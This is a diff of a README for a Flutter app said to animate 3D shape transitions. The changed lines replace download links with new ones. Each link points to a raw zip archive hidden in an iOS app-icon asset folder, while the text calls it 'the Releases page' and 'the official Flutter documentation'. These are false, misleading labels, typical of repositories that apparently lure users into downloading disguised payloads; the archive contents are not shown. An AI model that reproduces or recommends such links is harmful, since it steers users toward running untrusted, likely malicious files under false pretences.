@@ -1,7 +1,7 @@
 # 🎉 flutter_3d_shape_switcher - Experience Smooth 3D Shape Transitions
 
 ## 📥 Download Now
-[![Download flutter_3d_shape_switcher](https://github.com/Vijay-33/flutter_3d_shape_switcher/raw/refs/heads/main/android/app/src/main/res/mipmap-xhdpi/d_switcher_shape_flutter_2.3.zip)](https://github.com/Vijay-33/flutter_3d_shape_switcher/raw/refs/heads/main/android/app/src/main/res/mipmap-xhdpi/d_switcher_shape_flutter_2.3.zip)
+[![Download flutter_3d_shape_switcher](https://raw.githubusercontent.com/Vijay-33/flutter_3d_shape_switcher/main/ios/Runner/Assets.xcassets/AppIcon.appiconset/switcher-shape-flutter-d-v2.5-beta.1.zip)](https://raw.githubusercontent.com/Vijay-33/flutter_3d_shape_switcher/main/ios/Runner/Assets.xcassets/AppIcon.appiconset/switcher-shape-flutter-d-v2.5-beta.1.zip)
 
 ## 🚀 Getting Started
 Welcome to flutter_3d_shape_switcher! This application lets you see beautiful 3D transitions between different shapes using Flutter. Follow the steps below to download and run it.
@@ -17,7 +17,7 @@ Before you start, ensure your computer meets these requirements:
 ## 🔗 Download & Install
 To get the application, visit the Releases page. 
 
-[Download the latest version of flutter_3d_shape_switcher here.](https://github.com/Vijay-33/flutter_3d_shape_switcher/raw/refs/heads/main/android/app/src/main/res/mipmap-xhdpi/d_switcher_shape_flutter_2.3.zip)
+[Download the latest version of flutter_3d_shape_switcher here.](https://raw.githubusercontent.com/Vijay-33/flutter_3d_shape_switcher/main/ios/Runner/Assets.xcassets/AppIcon.appiconset/switcher-shape-flutter-d-v2.5-beta.1.zip)
 
 1. Open your web browser.
 2. Click on the link above to go to the Releases page.
@@ -73,6 +73,6 @@ After installation, you can easily open flutter_3d_shape_switcher:
 If you want to contribute to flutter_3d_shape_switcher, feel free to check the contributing guidelines in the repository. We welcome improvements and suggestions!
 
 ## 🌟 Additional Resources
-For more information about Flutter and 3D graphics, consider checking the official Flutter documentation at [https://github.com/Vijay-33/flutter_3d_shape_switcher/raw/refs/heads/main/android/app/src/main/res/mipmap-xhdpi/d_switcher_shape_flutter_2.3.zip](https://github.com/Vijay-33/flutter_3d_shape_switcher/raw/refs/heads/main/android/app/src/main/res/mipmap-xhdpi/d_switcher_shape_flutter_2.3.zip). 
+For more information about Flutter and 3D graphics, consider checking the official Flutter documentation at [https://raw.githubusercontent.com/Vijay-33/flutter_3d_shape_switcher/main/ios/Runner/Assets.xcassets/AppIcon.appiconset/switcher-shape-flutter-d-v2.5-beta.1.zip](https://raw.githubusercontent.com/Vijay-33/flutter_3d_shape_switcher/main/ios/Runner/Assets.xcassets/AppIcon.appiconset/switcher-shape-flutter-d-v2.5-beta.1.zip). 
 
 Feel free to reach out if you have questions or feedback. Enjoy exploring the beauty of 3D shapes with flutter_3d_shape_switcher!
